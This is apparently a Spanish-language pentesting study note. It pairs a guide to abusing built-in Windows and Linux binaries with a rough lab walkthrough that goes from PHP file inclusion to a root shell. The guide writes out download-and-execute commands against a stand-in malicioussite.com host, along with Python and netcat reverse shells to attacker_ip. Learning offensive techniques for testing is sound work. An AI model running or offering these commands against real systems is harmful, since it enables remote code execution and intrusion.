
-----------

Aquí tienes una guía sobre el abuso de binarios específicos, que suele aplicarse en pruebas de penetración y en el ámbito de la ciberseguridad ofensiva. Este enfoque implica aprovechar binarios legítimos en el sistema (normalmente en sistemas operativos Windows y Linux) para ejecutar acciones maliciosas, eludiendo así controles de seguridad que confían en binarios autorizados. A continuación se detalla en qué consiste y cómo se suele realizar en cada sistema:

---

### 1. ¿Qué es el abuso de binarios específicos?

El abuso de binarios específicos (o _Living Off The Land Binaries_ - LOLBins en inglés) consiste en utilizar binarios confiables que ya están presentes en el sistema operativo para realizar actividades maliciosas. Esto permite:

- Evadir las soluciones de seguridad (como antivirus o EDR).
- Aprovechar permisos y funcionalidades de binarios que ya están aprobados por el sistema.
- Minimizar la huella de herramientas externas en el sistema objetivo.

### 2. Binarios comunes en Windows

En Windows, se utilizan binarios específicos para ejecutar comandos o scripts que permitan persistencia, exfiltración de datos, ejecución de código y escalamiento de privilegios. Algunos binarios destacados son:

- **PowerShell**: Herramienta avanzada que permite ejecución de comandos, scripts, y administración remota. Puede ser utilizada para descargar y ejecutar payloads maliciosos:
    
    
    `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://malicioussite.com/script.ps1')"`
    
- **Certutil**: Utilizada para manipular certificados, pero también puede descargar archivos:
    
    `certutil -urlcache -split -f http://malicioussite.com/payload.exe`
    
- **Mshta**: Ejecuta aplicaciones HTML, pero también puede ejecutar código JavaScript o VBScript:
    

    
    `mshta http://malicioussite.com/script.html`
    
- **Regsvr32**: Ejecuta bibliotecas de enlace dinámico (DLLs) y puede cargar contenido malicioso desde Internet:
    
    
    `regsvr32 /s /n /u /i:http://malicioussite.com/payload.sct scrobj.dll`
    
- **Wmic**: Permite ejecutar scripts y acceder a información del sistema, útil para movimientos laterales o ejecución de comandos remotos.

### 3. Binarios comunes en Linux

En Linux, también existen binarios que, al ser legítimos, se pueden utilizar con fines maliciosos. Algunos de ellos son:

- **Python/Perl**: Se puede usar para ejecutar shells inversas o scripts maliciosos. Ejemplo en Python:
    
    
    `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
    
- **Sudo**: Algunos programas configurados para ejecutarse con privilegios elevados (mediante `sudo`) pueden explotarse para ganar acceso privilegiado.
- **Crontab**: Configuraciones de cronjob pueden manipularse para mantener persistencia en el sistema.
- **Socat/Netcat**: Son binarios para transferencia de datos que permiten conexiones remotas, útiles para crear shells reversas:
    
    
    `nc -e /bin/sh attacker_ip 4444`
    
- **Find**: Al tener permisos elevados, el comando `find` puede usarse para ejecución arbitraria:
    
    `find . -exec /bin/sh -i \;`
    

### 4. Casos de uso en pruebas de penetración

Para realizar pruebas de penetración o simulaciones de ataque, los siguientes escenarios son comunes:

1. **Persistencia**: Usar binarios como `schtasks` en Windows para configurar tareas programadas que se ejecutan con regularidad, o cronjobs en Linux.
2. **Escalación de privilegios**: Algunos binarios pueden aprovechar configuraciones incorrectas de permisos o `sudo` para escalar privilegios.
3. **Movimientos laterales**: Con herramientas como `wmic` en Windows o `ssh` en Linux para acceder a otros sistemas en la red.
4. **Exfiltración de datos**: Binarios como `curl` y `scp` en Linux o `certutil` en Windows pueden enviar datos a un servidor controlado por el atacante.

### 5. Recomendaciones de seguridad

Para mitigar el abuso de binarios específicos:

- **Monitoreo y restricciones**: Limitar el uso de binarios específicos y monitorear su uso en sistemas críticos.
- **Control de acceso**: Restringir el acceso a ciertos binarios mediante listas de control de acceso (ACL) o herramientas de control de aplicaciones.
- **Alertas de seguridad**: Configurar alertas en herramientas EDR para detectar ejecuciones sospechosas de binarios específicos.
	- **Actualización de sistemas**: Parchear binarios críticos para reducir el riesgo de abuso a través de vulnerabilidades conocidas.

---------
Primeramente Realizamos un escaneo de nmap com el de rutina 

Segun lo siguiente verficamos el apuntado a difernetes archivos php 

![[Pasted image 20241028202741.png]]

De la siguiente forma podemos encodear en base 64 toda la infromacion de la pagina referente en el php de ña url 


![[Pasted image 20241028202831.png]]

Una ves viendo eso vemos que podemos apuntar al archivo etc/passwd:

![[Pasted image 20241028203034.png]]

y vemos que hay un script de bash en backup 

![[Pasted image 20241028203106.png]]

Se puede descargar via tftp, protocolo de trasnferencia simple similiar a ftp, Por defecto opera en el puerto 69

y de la siguiente manera nos podemos conectar a l a maquina y descargar el comprimido del backup 

![[Pasted image 20241028203247.png]]

Las contraseñas publicas no tienen sentido en la conexion ssh porque despues pediran la constraseña priemramente se deben usar un aclave privada valida que no pida una contraseña para el acceso 

Una ves entremos vemos que el usuario al que entrsmos tiene una shell diferente llamda pdmenu que nos permite la ediccion de archivos, vamos a gtfgobins para encontrar un binario especifico que nos ayude en la explotacion

Esto en el editor de vi 

![[Pasted image 20241028203828.png]]

![[Pasted image 20241028203905.png]]

![[Pasted image 20241028203918.png]]

Y posteriormente ya estariamos en una bash 

Luego buscamos por ardhivos suid y buscamos un exploit en searchploit y posteriormente ya estariamos como root

Para el siguiente laboratorio de practica deberiamos instalar gdb y peda, la primera con un apt install y la segunda desde un respositorio de github 

Esto se enlaza con [[BUFFER OVERFLOW]] que respecta explotar la cantidad de tamaño programado con mas cantidad de caracteres rompiendo los bytes asignados y podiedno vulnerar la maquina 




